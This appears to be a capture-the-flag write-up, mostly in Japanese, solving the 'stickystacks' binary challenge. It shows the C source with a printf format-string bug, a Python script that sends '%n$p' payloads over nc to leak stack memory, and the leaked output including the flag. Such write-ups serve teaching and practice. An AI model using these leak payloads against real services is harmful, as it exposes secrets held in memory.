# stickystacks:Binary:90pts
I made a [program](stickystacks) that holds a lot of secrets... maybe even a flag!  
[Source](stickystacks.c)  
Connect with `nc shell.actf.co 21820`, or visit `/problems/2021/stickystacks` on the shell server.  
Hint  
Is that what `printf` is for?  

# Solution
配布されたstickystacks.cを見ると以下のようであった。  
```C
~~~
typedef struct Secrets {
    char secret1[50];
    char password[50];
    char birthday[50];
    char ssn[50];
    char flag[128];
} Secrets;


int vuln(){
    char name[7];
    
    Secrets boshsecrets = {
        .secret1 = "CTFs are fun!",
        .password= "password123",
        .birthday = "1/1/1970",
        .ssn = "123-456-7890",
    };
    
    
    FILE *f = fopen("flag.txt","r");
    if (!f) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    fgets(&(boshsecrets.flag), 128, f);
    
    
    puts("Name: ");
    
    fgets(name, 6, stdin);
    
    
    printf("Welcome, ");
    printf(name);
    printf("\n");
    
    return 0;
}
~~~
```
自明なFSBがある。  
あとはstackを読み取ればよいが6文字限定の入力のようだ。  
%n$pで任意の箇所が読み取れることが知られている。  
以下のstackleak.pyでスタックを読み取り、文字へ変換する。  
```python:stackleak.py
import re
import subprocess

i = 1
while True:
    result = subprocess.check_output(f"echo '%{i}$p' | nc shell.actf.co 21820", shell=True)
    if not (b"nil" in result):
        result = result.replace(b"Name: \nWelcome, ", b"").replace(b"\n", b"")
        result = result.replace(b"0x", b"").decode()[::-1]
        result = re.split('(..)', result)[1::2]
        for j in result:
            print(chr(int(j[::-1], 16)), end="")
        if "d7" in result:# 0x7d = }
            break
    i += 1
```
実行する。  
```bash
$ python3 stackleak.py
0$Ö`ÿ rÇCTFs are fun!password1231/1/1970123-456-7890actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}
```
flagが得られた。  

## actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}